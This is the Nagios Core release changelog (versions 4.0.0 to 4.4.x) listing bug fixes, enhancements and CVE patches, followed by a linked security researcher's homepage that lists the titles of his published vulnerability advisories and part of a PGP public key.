* Fix comment data being duplicated after a `service nagios reload` or similar (#549)
* Fix check\_interval and retry\_interval not changing at the appropriate times (#551)
* Fixed passive checks sending recovery email when host was previously UP (#552)
* Fixed flapping comments duplication on nagios reload (#554)
* Fix for CVE-2018-13441, CVE-2018-13458, CVE-2018-13457 null pointer dereference
* Fixed syntax error in file: default-init.in (#558)
* Reset current notification number and state flags when the host recovers, reset all service variables when they recover fixes (#557)
* Fixed wrong counting of service status totals when showing servicegroup details (#548)
* Fixed avail.cgi not printing CSV output when checkbox is checked (for any type: host/service/hostgroup/servicegroup) (#570)
* Fixed nagios not logging SOFT state changes after 1

## 4.4.1 – 2018-06-25

### Fixes

* Revert some macro->kvvec changes causing problems when `enable\_environment\_macros` was enabled
* Adjust `process\_macro\_r` function logic so that it handles macros properly
* Fix spec file for systemd
* Fix bug where `ssize\_t` typedef to int on some systems

## 4.4.0 – 2018-06-19

### Enhancements

* new status for check dependencies
* Allow more flexible requirements for comments
* Add a `statusCRITICALACK` class for the status column
* CSV output based on groups (all options)
* New Macro(s) to generate URL for host / service object to be used in notifications
* New Macro(s) to determine if host/service notifications are enabled (#419)
* New Macro(s) for obtaining the host/service notification periods (#350)
* enable\_page\_tour interface option
* Code cleanups in important sections (Workers, Handling Results)
* Automatic mail program detection (with same /bin/mail failback)
* Incorporated [autoconf-macros](https://github.com/NagiosEnterprises/autoconf-macros) into Core
* Lots of enhancements/additions to configure/make process.
  + Moved all files to startup/
  + Added upstart job
* Added system limit detection (RLIMIT\_NPROC) to check for anticipated fork() failures (#434)
* Added stalking on notifications (`N` or `notifications` option when specifying `stalking\_options`) (#342)
* Added automatic `systemctl daemon-reload` and `initctl reload-configuration` where applicable on `make install-init`
* Added case-insentive command submission. (#373)
* Enabled `check\_external\_commands` by default

### Fixes

* Command line macro detection skips potential macros with no ending dollar sign
* Fixed a lockup condition sometimes encountered on shutdown or restart
* Fixed negative time offset calculations computing incorrectly sometimes
* Fixed reloads causing defunct (zombie) processes (#441)
* Fixed wait3(), wait4() implementations (replaced with waitpid()) (#326)
* Fixed additive inheritance not testing for duplicates in hosts/services/(+escalations) (#392)
* Fixed very very (around 600k chars or greater) large plugin output crashing Nagios (#432)
* Fixed first\_notification\_delay not beeing calculated from last\_hard\_state\_change (#425)
* Fixed duplicate downtime ID occuring from downtimes in retention file (#506)
* Fixed segfault when navbarsearch was used in status.cgi for something other than a host (#489)
* Fixed some miscellaneous ./configure issues on Solaris
* Fixed “Locate host on map” link (#496) (Troy Lea)
* Fixed service groups defined with unknown service members (that aren’t first in the list) not erroring out (#500)
* Fixed tac.cgi to have consistent behavior with the other cgis (#481)
* Fixed clear\_host/service\_flapping command logic to broker/notify properly (#525)

## 4.3.4 – 2017-08-24

### Fixes

* Improved config file parsing
* Fixed configure script to check for existence of /run for lock file
* Use absolute paths when deleting check results files
* Add sanity checking in reassign\_worker

## 4.3.3 – 2017-08-12

### Fixes

* xodtemplate.c wrong option-deprecation code warning
* On-demand host check always use cached host state
* ‘á’ causes Serivce Status Information to not be displayed
* New Macro(s) to generate URL for host / service object
* Fix minor map issues
* Fix lockfile issues
* Switch order of daemon\_init and drop\_priveleges
* Add an OpenRC init script

## 4.3.2 – 2017-05-09

### Fixes

* Every 15sec /var/log/messages is flooded with “nagios: set\_environment\_var”
* Changed release date to ISO format (yyyy-mm-dd)
* `make all` fails if unzip is not installed
* Quick Search no longer allows search by Alias
* flexible downtime on a service immediately turns off notifications
* Fix to allow url\_encode to be called twice
* Update timeperiods.cfg.in (spelling)
* Spelling fixes
* Vent command pipe before remove to avoid deadlocks on writing end
* CGI utility cgiutil.c does not process relative config file path names properly
* xdata/xodtemplate.c bug in option-deprecation code
* Wildcard searching causes service status links to not work properly
* Quick search with no hits shows a permission denied error
* Setting a service as its own parent is not caught by the sanity checker (-v) and causes a segfault

## 4.3.1 – 02/23/2017

### Fixes

* Backed out the changes related to the “login page” and “logoff link” from 4.3.0, since it was causing problems
* Service hard state generation and host hard or soft down status
* Comments are duplicated through Nagios reload
* host hourly value is incorrectly dumped as json boolean
* Bug – Quick Search no longer allows search by IP
* Config: status\_update\_interval can not be set to 1
* Check attempts not increasing if nagios is reloaded
* nagios hangs on reload while sending external command to cmd file
* Feature Request: return code xxx out of bounds – include message as well

## 4.3.0 – 02/21/2017

### Security

* Fix for CVE-2016-6209 – The “corewindow” parameter (as in http://localhost/nagios?corewindow=www.somewhere.com) has been disabled by default. See the UPGRADING document for how to enable it.

### Enhancements

* Added new flag to cgi.cfg: tac\_cgi\_hard\_only to show only HARD state
* Add broker-event for the end of a timed event (NEBTYPE\_TIMEDEVENT\_END)
* There is no Macro to retrieve addresses of hostgroup members (now $HOSTGROUPMEMBERADDRESSES$)
* Add “Page Tour” videos to several of the core web pages
* Added a login page, and a `Logoff` links
* On the status map, the host name will be colored if services are not all OK.
* Added “Clear flapping state” command on host and services detail pages.
* User-entered comment now displays below generated comment for downtime

### Fixes

* Fix early event scheduling
* on-demand host checks triggered by service checks cause attempt number increments
* Service notification not being send when host is in soft down state
* configure does not error if no perl installed on CentOS 7
* failed passive requests leave .ok files in checkresults dir
* Services don’t show in status.cgi if “noheader” specified
* Standardized check interval config file names
* “Event Log” (showlog.cgi) could not open log file
* “nagios\_check\_command” has been deprecated since v3.0. Last vestiges removed

## 4.2.4 – 12/07/2016

### Security

* Fixed another root privilege escalation (CVE-2016-9566) Thanks for bringing this to our attention go to Dawid Golunski (http://legalhackers.com).

## 4.2.3 – 11/21/2016

### Security

* There was a fix to a root privilege escalation (CVE-2016-8641)

### Fixes

* external command during reload doesn’t work
* Nagios provides no error condition as to why it fails on the verify for serviceescalation
* No root group in FreeBSD and Apple OS X
* jsonquery.html doesn’t display scheduled\_time\_ok correctly
* daemon\_dumps\_core=1 has no effect on Linux when Nagios started as root
* Configuration check in hostgroup – misspelled hostname does not error
* contacts or contact\_groups directive with no value should not be allowed
* Compile 64-bit on SPARC produces LD error
* HOSTSTATEID returns 0 even if host does not exist
* Submitting UNREACHABLE passive result for host sets it as DOWN if the host has no parents
* nagios: job XX (pid=YY): read() returned error 11 (changed from LOG\_ERR to LOG\_NOTICE)
* Fix for quick search not showing services if wildcard used

## 4.2.2 – 10/24/2016

### Security

* (CVE-2016-9565) There was a fix to vulnerability CVE-2008-4796 in the 4.2.0 release on August 1, 2016. The fix was apparently incomplete, as there was still a problem. However, we are now getting all RSS feeds using AJAX calls instead of the (outdated) MagpieRSS package.

### Enhancements

* Update status.c to display passive check icon for hosts when passive checks are enabled and actives disabled

### Fixes

* Fix permissions for Host Groups reports (status.cgi)
* Service Parents does not appear to be functioning as intended
* Availability report mixes up scheduled and unscheduled warning percentages
* Invalid values for saved\_stamp in comput\_subject\_downtime\_times()
* Remove deprecated “framespacing”
* The nagios tarball contains two identical jquery copies
* extinfo.cgi does not set content-type (most cgi’s don’t)
* Timeperiods are corrupted by external command CHANGE\_SVC\_CHECK\_TIMEPERIOD
* Quick search doesn’t show hosts without services (service status detail page)
* In host/services details view, if exactly 100 entries would not show last one
* nagios host URL parameter for NEW map doesn`t work – Network Map for All Hosts
* next\_problem\_id is improperly initialized
* Passive problems not showing as “unhandled”
* September reported as Sept instead of Sep
* Notifications are not sent for active alerts after scheduled downtime ends
* Nagios 4.2.0 not working on Solaris
* install-exfoliation and install-classicui don’t work FreeBSD and Mac OS X
* Updated makefile to delete some no-longer-needed files

## 4.2.1 – 09/06/2016

### Fixes

* Fix undefined variable php error
* Links on the sidebar menu under ‘Problems’ are indented too far
* Using $ARGn$ Macros in perfdata
* using a wildcard in search returns service status total all zero’s
* read\_only does not take priority
* Running nagios -v on 4.2.0 takes 90+ seconds
* Bare “make” invoked in subtarget
* Theme images/stylesheets installed with inconsistent permissions
* Missing Image for Host and Service State Trends in Availability Report
* Maintain non-persistent comments through reload
* Servicegroup availability report ignores includesoftstates in service report links
* error: format not a string literal and no format arguments
* Synced config.guess and config.sub with GNU

## 4.2.0 – 08/01/2016

### Security

* Fix for CVE-2008-4796
* Fix for CVE-2013-4214
* Fix for a Cross-Site Request Forgery attack vulnerability

### Enhancements

* Increase socket queue length to avoid missing any connections
* Added the host name to the website page title
* The new Status Map will now use cgi.cfg options
* The default\_statusmap\_layout will default to “6” for the new map
* The new Status Map will now show some valid values in the popup for “Nagios Process”

### Fixes

* Network Outage will now work for people who don’t have access to all hosts
* Fixed a problem that caused workers to loop
* Fixed how HTML output from plugins gets handled
* Fix for Command worker failing to handle SIGPIPE
* Fix for some “Core Worker seems to be choked” conditions
* Fixed a CPU load problem during polling on FreeBSD
* Fixed a CPU load problem with workers
* Flexible downtime no longer reported as “unscheduled”
* Setting “flap\_detention\_enabled” to 0 (zero) will now remove flapping state
* Several fixes to the new maps
* Better handling of UTF-8 characters in plugin output
* Reports were not handling custom time periods with special characters
* A couple of fixes to the init script
* Fixes to the JSON output
* State history now uses plugin long output

## 4.1.1 – 08/19/2015

### Fixes

* Fixed CGI’s not being able to read object configuration data when dependencies were present (John Frickson)
* Fix for exclude (!) not working for dependencies (John Frickson)

## 4.1.0 – 08/18/2015

### Enhancements

* Make sticky status for acks and comments configurable enhancement #20 (Trevor McDonald / Scott Wilkerson)
* Add host\_down\_disable\_service\_checks directive to nagios.cfg #44 (Trevor McDonald / Scott Wilkerson)
* Promoted JSON CGIs to released status (Eric Stanley)
* New graphical CGI displays: statusmap, trends, histogram (Eric Stanley)
* httpd.conf doesn’t support Apache version > 2.3 (DanielB / John Frickson)

### Fixes

* Fix for not all service dependencies created (John Frickson)
* Fix SIGSEGV with empty custom variable (orbis / John Frickson)
* Fix contact macros in environment variables (dvoryanchikov)
* Fixed host’s current attempt goes to 1 after going to hard state (John Frickson)
* Fixed two bugs/problems: Replace use of %zd in base/utils.c & incorrect va\_start() in cgi/jsonutils.c (Peter Eriksson)
* Fixed: Let remove\_specialized actually remove all workers (Phil Mayers)
* Fixed log file spam caused when using perfdata command directives in nagios.cfg (shashikanthbussa)
* Fixed off-by-one error in bounds check leads to segfault (Phil Mayers)
* Added links for legacy graphical displays (Eric Stanley)
* Update embedded URL’s to https versions of Nagios websites (scottwilkerson)
* Fixed doxygen comments to work with latest doxygen 1.8.9.1 #30 (Trevor McDonald)
* Fixed makefile target “html” to PHONY to fix GitHub issue #28 (Trevor McDonald)
* Fixed typo as per GitHub issue #27 (Trevor McDonald)
* Fixed jsonquery.php 404 not found error, and disabled Send Query button until form populates #43 (Scott Wilkerson)
* Fixed linking in Tactical Overview for several of the Host entries in Featured section #48 (Scott Wilkerson)
* Fixed passing limit and sort options to pagination and sort links #42 (Scott Wilkerson)
* Added form field for icon URL and clean-up when it changes in CGI Status Map. (Eric Stanley)
* Added options to cgi.cfg to uncheck sticky and send when acknowledging a problem (Trevor McDonald)
* Low impact changes to automate the generation of RPMs from nagios.spec file. (T.J. Yang)
* Update index.php (Trevor McDonald)
* Fixed escaping of corewindow parameter to account for possible XSS injection (Scott Wilkerson)
* Typo correction (T.J. Yang)
* Make getCoreStatus respect cgi\_base\_url (Moritz Schlarb)
* Adjusted map layout to work within frames (Eric Stanley)
* Fixed map displays are now the full size of browser window (Eric Stanley)
* Fixed labels and icons on circular markup no longer scale on zoom (Eric Stanley)
* Got all maps except circular markup working with icons (Eric Stanley)
* Fixes to make legacy CGIs work again. (Eric Stanley)
* Fixes to make all/html target tolerant of being run multiple times (Eric Stanley)
* For user-supplied maps, converted node group to have transform (Eric Stanley)
* Fixed issue transitioning from circular markup map to other maps (Eric Stanley)
* Fix displayForm to trigger on the buttom press (Scott Wilkerson)
* Fix fo getBBox crash on Firefox (Eric Stanley)
* Fixed map now resets zoom when form apply()’d (Eric Stanley)
* Fixed so close box on dialogs actually closes dialog (Eric Stanley)
* Corrected directive in trends display (Eric Stanley)
* Fixed minor issue with link in trends linkes (Eric Stanley)
* Fixed issue with map displaying on Firefox (Eric Stanley)
* Added exclusions for ctags generation (Eric Stanley)
* Update map-popup.html (Scott Wilkerson)
* Initial commit of new graphical CGIs (Eric Stanley)
* Fixed Github bug #18 – archivejson.cgi returns wrong host for state change query (Eric Stanley)
* Status JSON: Added next\_check to service details (Eric Stanley)
* Fixed escaping of keys for scalar values in JSON CGIs (Eric Stanley)
* build: Include <sys/loadavg.h> if it exists. (Eric J. Mislivec)
* lib-tests: test-io{cache|broker} need -lsocket to link. (Eric J. Mislivec)
* lib-tests: test-runcmd assumes GNU echo. (Eric J. Mislivec)
* lib-tests: Signal handlers don’t return int on most platforms, and using a cast was the wrong way to resolve this. (Eric J. Mislivec)
* Fix some type/format mismatch warnings for pid\_t. (Eric J. Mislivec)
* Fix build on Solaris. (Eric J. Mislivec)
* runcmd: Fix build when we don’t HAVE\_SETENV. (Eric J. Mislivec)
* Fixed checkresult output processing (Eric Mislivec)
* Corrected escaping of long output macros (Eric Mislivec)
* Fixed null pointer dereferences in archive JSON (Eric Stanley)
* Fixed memory overwrite issue in JSON string escaping (Eric Stanley)
* JSON CGI: Now escaping object and array keys (Eric Stanley)

## 4.0.8 – 08/12/2014

### Enhancements

* Removed 8 kB string size limitation in JSON CGIs (Eric Stanley)
* Re-implemented auto-rescheduling of checks (Eric Mislivec)
* Avoid bunching of checks delayed due to timeperiod constraints (Eric Stanley)
* Limit the number of autocalculated core workers to not spawn too many on large systems (Eric Mislivec, Janice Singh)

### Fixes

* Removed quotes from numeric duration values in JSON CGIs (Eric Stanley)
* Fixed escaping in JSON CGIs so all required characters are escaped, and in the correct order (Eric Stanley)
* Fixed segfault in archive JSON CGI when plugin output was empty (Eric Stanley)
* Fixed several possibilities for buffer overflow (Eric Mislivec, Dirkjan Bussink)
* Fixed Tracker #582, #626: Handle VAR=VAL assignments at the start of simple commands (Eric Mislivec, Phil Randal)
* Fixed Tracker #630: Recognize ‘<‘ and ‘>’ as redirection operators (Eric Mislivec)
* Corrected worker communication protocol documentation (Phil Mayers)
* Fixed init script to leave config test log in a better location, let sysconfig override init script variables, and not remove nagios.cmd when attempting to start with another instance running (Eric Mislivec, Robin Kearney)
* Fixed Tracker #361: Downtime notifications not displayed properly (Andrew Widdersheim)

## 4.0.7 – 06/03/2014

### Enhancements

* Added value of custom variables to Object JSON output for hosts, services and contacts (Eric Stanley)

### Fixes

* Fixed bug #616: Unescape plugin output read from checkresult files, fix multiline perf data concatenation, and avoid extra memory allocation and copies. (Eric Mislivec)
* Fixed bug #609: Image on home page doesn’t have correct image path prefix. (Derek Brewer)
* Fixed bug #608: Extra newline in service check timeout output string. (Mauno Pihelgas)
* Fixed bug #596: Crashes checking contact authorization for host escalations. (Alexey Dvoryanchikov – duplicates #590, #586)
* Fixed bug #496: Syntax error in exfoliation’s common.css. (Karsten Weiss)

## 4.0.6 – 04/29/2014

### Enhancements

* Added name of authenticated user to JSON CGI results object (Eric Stanley)
* Added Nagios Core version to the Status JSON CGI programstatus query (Eric Stanley)
* Added daemon status to main page (Eric Mislivec)

### Fixes

* Fixed bug #600: Service Check Timeout State always returns OK (0) status (Mauno Pihelgas, Eric Stanley)
* Fixed bug #583: Status Check Output of (No output on stdout) stderr: (Eric Stanley – duplicate of bug #573)
* Fixed bug #573: Service checks returns (No output on stdout) stderr (Eric Stanley)
* Fixed bug #438: Reloads during downtime causes wrong availability calculations (Eric Stanley)
* Fixed feed updates when daemon can not access external networks (Eric Mislivec)
* Archive JSON: Fixed bugs calculating availability (Eric Stanley)
* Archive JSON: Allow missing logs to be skipped (Eric Stanley)

## 4.0.5 – 04/11/2014

### Fixes

* Fixed bug #595: Nagios 4 security fix (Alexey Dvoryanchikov, Eric Stanley)
* Fixed bug #594: Nagios 4 fix contactgroups parsing (Alexey Dvoryanchikov, Eric Stanley)
* Fixed bug #577: Nagios 4 checks stalled when write to socket failed (Alexey Dvoryanchikov)
* Fixed bug #580: Nagios 4 memory leak (Eric Stanley)
* Fixed init script to remove the switching of users when performing configuration verification which was causing failures if nagios user was set to nologin (Scott Wilkerson)
* Fixed auto creation of RAMDISK via environment variables in init script to properly check existence using $RAMDISK\_DIR environment variable. (Scott Wilkerson)
* Fixed unreferenced variable NagiosVarDir in daemon-init (Eric Mislivec)
* Fixed bug where audio alerts wouldn’t work with a 0 height and width – https://support.nagios.com/forum/viewtopic.php?t=26387 (Scott Wilkerson)

## 4.0.4 – 03/14/2014

### Enhancements

* JSON CGIs moved to beta status (Eric Stanley)

### Fixes

* Fixed bug #491,#553: Rebuilt the daemon-init scripts back to something that should work on all systems (Scott Wilkerson)

## 4.0.3 – 02/28/2014

### Enhancements

* Aliased hourly\_value to importance and minimum\_value to minimum\_importance and deprecated the former (Eric Stanley)
* Added host and service importance macros (Eric Stanley)
* Added notifications on flexible downtime expiration (Dan Wittenberg)

### Fixes

* Bug #548: Temporary fix that rejects all external command during restart to prevent Core from crashing (Eric Stanley)
* Corrected calculation of host importance and importance defaults (Eric Stanley)
* Fixed bug #498: Nagios 4 enable\_environment\_macros=1 not working (Eric Stanley, Alexey Dvoryanchikov)
* No longer checks whether logs can be written when verifying configuration (Eric Stanley)
* Fixed CGI bug where the CGI could read past the end of the list of CGI variables, potentially crashing the CGI (Scott Wilkerson)
* Fixed inheritance of hourly\_value from host and service templates (Scott Wilkerson)
* Fixed bug #502: 4.0.0: Configuration -> Service Escalations = incomplete list (Eric Stanley)
* Fixed bug #523: quotes and double quotes in plugin message are converted to HTML escapes in Nagios 4.0 (duplicate of bug #524)
* Fixed bug #524: URLs returned in plugin check results are not correctly displayed (Eric Stanley)
* Fixed bug where passive service checks would return “Service check timed out after 0.00 seconds” (Scott Wilkerson)

## 4.0.2 – 11/25/2013

### Fixes

* Fixed bug 528: Nagios 4.0.1: Logrotation: Only current host- and servicestates saved in rotated logfiles (duplicate of 507)
* Fixed bug 507: Nagios 4.0.0 – Problem during log rotate (Stefano Ghelfi)
* Fixed bug 530: RPM spec file sets wrong permissions on plugins directory (duplicate of bug 494)
* Fixed bug 494: nagios.spec fixes (with patch) (Karsten Weiss)
* Fixed bug 515: Segsegv after starting up nagios (duplicate of bug 526)
* Fixed bug 513: Crash while entering downtime for service (duplicate of bug 526)
* Fixed bug 529: Core Worker failed to reap child in 4.0.1 Description
* Fixed bug 514: scheduled downtime not showing in web interface (Eric Stanley)
* Fixed bug 526: sort\_downtime() corrupts scheduled\_downtime\_list causing segfault (Adam James)
* Fixed bug 492: Nagios 4 fails to remove/add checks upon reload (Eric Stanley)
* Fixed Bug 484: Beta4.0.0b4 service checks returning (No output on stdout) (Eric Stanley)
* Fixed Bug 470: statusmap doesn’t display info (Cameron Moore)
* Fixed Bug 499: Security issue in daemon-init.in, function check\_config (Tómas Edwardsson)

## 4.0.1 – 10/15/2013

### Enhancements

* Added compiler flags in RPM spec file to reduce compiler noise (Dan Wittenberg)
* Added logging of failure in dlclose() call (Anton Lofgren)
* Added a simple query handler interface, nagios-qh.rb (Dan Wittenberg)
* Multiple code simplifications, additional error handling in downtime code (Andreas Ericsson)

### Fixes

* Reverted commit f99a9a7b which set check\_interval to 1 if it was configured as zero.
* Corrected order of arguments when logging unknown hosts/services (Scott Wilkerson)
* Downtime initialized before retention data read (Eric Stanley)
* Patches to make RPM build again (Dan Wittenberg)
* Ensure that scheduled\_downtime\_depth never drops below zero (Andreas Ericsson)

## 4.0.0 – 09/20/2013

**See changes in [What’s New](http://nagios.sourceforge.net/docs/nagioscore/4/en/whatsnew.html) page of documentation**

[![Nagios](https://www.nagios.org/wp-content/uploads/2023/12/Nagios-Logo.svg)](https://www.nagios.org)

[Facebook-f](https://www.facebook.com/NagiosInc)

[Youtube](https://www.youtube.com/nagiosvideo)

[Linkedin-in](https://www.linkedin.com/company/nagios-enterprises-llc)

[X-twitter](https://x.com/nagiosinc)

##### [Home](https://www.nagios.org/)

[Downloads](https://www.nagios.org/launch/)

[Forum](https://www.nagios.org/community/)

[FAQ](https://www.nagios.org/faq/)

[Upgrade](https://www.nagios.org/upgrade/)

##### [Legal](https://www.nagios.com/legal)

[Privacy Policy](https://www.nagios.com/legal/privacypolicy/)

[Terms of Use](https://www.nagios.com/legal/termsofuse/)

[Trademarks](https://www.nagios.com/legal/trademarks/)

##### [Projects](https://www.nagios.org/projects/)

[Nagios Core](https://www.nagios.org/projects/nagios-core/)

[Nagios Plugins](https://www.nagios.org/downloads/nagios-plugins/)

[Nagios Gearman](https://www.nagios.org/projects/nagios-mod-gearman/)

##### [Nagios CSP](https://www.nagios.org)

[What’s Included](https://www.nagios.org/whats-included-in-nagios-csp)

[Switch From Nagios Core](https://www.nagios.org/switch)

##### [About](https://www.nagios.org/about/)

[The Nagios Project](https://www.nagios.org/projects/)

[The Nagios Story](https://www.nagios.org/story/)

[The Nagios Team](https://www.nagios.org/team/)

##### [Solutions](https://www.nagios.com/solutions/)

[Why Nagios Is Best](https://www.nagios.org/why-nagios/)

[Nagios Alternatives](https://www.nagios.org/alternative/)

[Extending Nagios](https://www.nagios.org/extend/)

##### [Community](https://www.nagios.org/about/community/)

[Bounty Program](https://www.nagios.org/bounty/)

[Nagios MVPs](https://www.nagios.org/mvp/)

[Nagios Addons](https://www.nagios.org/mvp/)

[Nagios Conference](https://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=footer)

**Nagios Provides Complete Monitoring Of:** [Windows](https://www.nagios.com/solutions/windows-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Linux](https://www.nagios.com/solutions/linux-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [UNIX](https://www.nagios.com/solutions/unix-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Servers](https://www.nagios.com/solutions/server-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Websites](https://www.nagios.com/solutions/website-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [SNMP](https://www.nagios.com/solutions/snmp-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [DHCP](https://www.nagios.com/solutions/dhcp-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [DNS](https://www.nagios.com/solutions/dns-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Email](https://www.nagios.com/solutions/email-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Storage](https://www.nagios.com/solutions/storage-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Files](https://www.nagios.com/solutions/file-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Apache](https://www.nagios.com/solutions/apache-log-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [IIS](https://www.nagios.com/solutions/iis-log-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [EC2](https://www.nagios.com/solutions/amazon-ec2-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), and [more](https://www.nagios.com/solutions/?utm_campaign=solutions&utm_source=org&utm_medium=footer)!

Nagios, the Nagios logo, and Nagios graphics are the servicemarks, trademarks, or registered trademarks owned by Nagios Enterprises. All other servicemarks and trademarks are the property of their respective owner. Website Copyright © 2009-currentYear Nagios Enterprises, LLC. All rights reserved.



=== Content from legalhackers.com_bd402dbf_20250126_033742.html ===


## LEGAL HACKERS

# Dawid Golunski

Information Security.

Security Research.

Legal/ethical Hacking.

Penetration Testing.

# Contact

![](static/email_sm.png) e-mail  >

![](static/twit.jpg) twitter > [@dawid\_golunski](https://twitter.com/%40dawid_golunski)

# Security advisories

Some of the released advisories can be found below:

1. [Git-LFS <= 2.12 Remote Code Execution (RCE) Vulnerability CVE-2020-27955](https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html)
2. [Wordpress 4.6 - Unauthenticated RCE Exploit (Remote Code Execution)](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)
3. [SquirrelMail <= 1.4.22 <= 1.4.23 Remote Code Execution (CVE-2017-7692)](./advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)
4. [Zend Framework / zend-mail < 2.4.11 Remote Code Execution (CVE-2016-10034)](./advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html)
5. [SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)](./advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html)
6. [PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) (0day Patch Bypass/Exploit)](./advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)
7. [PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)](./advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)
8. [Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](./advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)
9. [Nagios Core < 4.2.2 Curl Command Injection / Code Execution (CVE-2016-9565 / CVE-2008-4796)](./advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
10. [Wget < 1.18 Access List Bypass / Race Condition (CVE-2016-7098)](./advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html)
11. [Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation (CVE-2016-1247)](./advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
12. [MySQL / MariaDB / Percona - Privilege Esc. / Race Condition (CVE-2016-6663 / CVE-2016-5616)](./advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)
13. [MySQL / MariaDB / Percona - Root Privilege Escalation (CVE-2016-6664 / CVE-2016-5617)](./advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html)
14. [Apache Tomcat (RedHat-based distros) - Root Privilege Escalation (CVE-2016-5425)](./advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html)
15. [Apache Tomcat (Debian-based distros) <= 6/7/8 Root Privilege Escalation (CVE-2016-1240)](./advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html)
16. [MySQL / MariaDB / Percona - Remote Root Code Execution / Privilege Esc. (0day) (CVE-2016-6662)](./advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html)
17. [Adobe ColdFusion <= 11 XML External Entity (XXE) Injection (CVE-2016-4264)](./advisories/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.html)
18. [vBulletin <= 5.2.2 Preauth Server Side Request Forgery (SSRF) (CVE-2016-6483)](./advisories/vBulletin-SSRF-Vulnerability-Exploit.html)
19. [Wget < 1.18 Arbitrary File Upload / Remote Code Execution (CVE-2016-4971)](./advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.html)
20. [CakePHP Framework <= 3.2.4 IP Spoofing Vulnerability](./advisories/CakePHP-IP-Spoofing-Vulnerability.html)
21. [Exim <= 4.86.2 Local Root Privilege Escalation](./advisories/Exim-Local-Root-Privilege-Escalation.html)
22. [Google AdWords API PHP client library <= 6.2.0 PHP Code Execution](./advisories/Google-AdWords-PHP-Client-library-PHP-Code-Execution.html)
23. [Google AdWords API client libraries - XML eXternal Entity Injection (XXE)](./advisories/Google-AdWords-API-libraries-XXE-Injection-Vulnerability.html)
24. [eBay Magento <= 1.9.2.1 XML eXternal Entity Injection (XXE) on PHP FPM](./advisories/eBay-Magento-XXE-Injection-Vulnerability.html)
25. [eBay Magento <= 1.9.2.1 Unrestricted Cron Script (Potential Code Execution / DoS)](./advisories/eBay-Magento-Unrestricted-Cron-Script-Vulnerability.html)
26. [Kirby CMS <= 2.1.0 Authentication Bypass via Path Traversal](./advisories/KirbyCMS-Path-Traversal-Authentication-Bypass-Vulnerability.html)
27. [Kirby CMS <= 2.1.0 CSRF Content Upload and PHP Script Execution](./advisories/KirbyCMS-CSRF-PHP-File-Upload-Vulnerability.html)
28. [Zend Framework <= 2.4.2 XML eXternal Entity Injection (XXE) on PHP FPM](./advisories/zend-framework-XXE-vuln.html)
29. [Nagios - Nagios Plugins - check\_dhcp = 2.0.2 Race Condition](./advisories/nagios-check_dhcp-race.html)
30. [Nagios - Nagios Plugins - check\_dhcp <= 2.0.1 Arbitrary Option File Read](./advisories/nagios-check_dhcp.html)
31. [Nagios - NRPE - Nagios Remote Plugin Executor <= 2.15 Remote Command Execution](./advisories/nagios-nrpe.html)
32. [Zabbix <= 1.8.1 SQL Injection](./advisories/zabbix181api-sql.html)
33. [Invision Power Board <= 3.0.4 Local PHP File Inclusion and SQL Injection](./advisories/invision_power_board_multiple_vulns.html)
34. [WordPress <= 2.8.5 Unrestricted File Upload Arbitrary PHP Code Execution](./advisories/wordpress_unrestricted_file_upload_vuln.html)

# PGP key

```
-----BEGIN [PGP PUBLIC KEY](http://legalhackers.com/dawid_lh.pgp) BLOCK-----

mQENBFXIwTYBCACx+HDekh0eiPpqXZOfbrQKKrbc5VZw6dB1HSIHPXZ9ifGMhGow
T6f8+gYU4SSlN/T9KiamAzlA9Nz7QdgEcXPq8tMexKQnoCyDM0wSHqOB1en7RRTN
JdchOynTYzFWt+IBoQRGspQE1SXP2RLUwioedtDz+C21iyNMwR6OcCoCFfGV2eeZ
aFM7oCKwSz9oxCJ+D3SUv5U9AZjKFoV0B52dJVVzeaqtnO3lJi7dK8+NTNY5ML+N
3cacO9qnngoNJ/iy/AtjTdmX+XHgCuSnEbY2kh3A1uAyr5ygh1YQ7K4kG7I7AXo9
lgrzQY7/xg8+uSY0NS4kJG/OEDBxX+yhNNBhABEBAAG0J0Rhd2lkIEdvbHVuc2tp
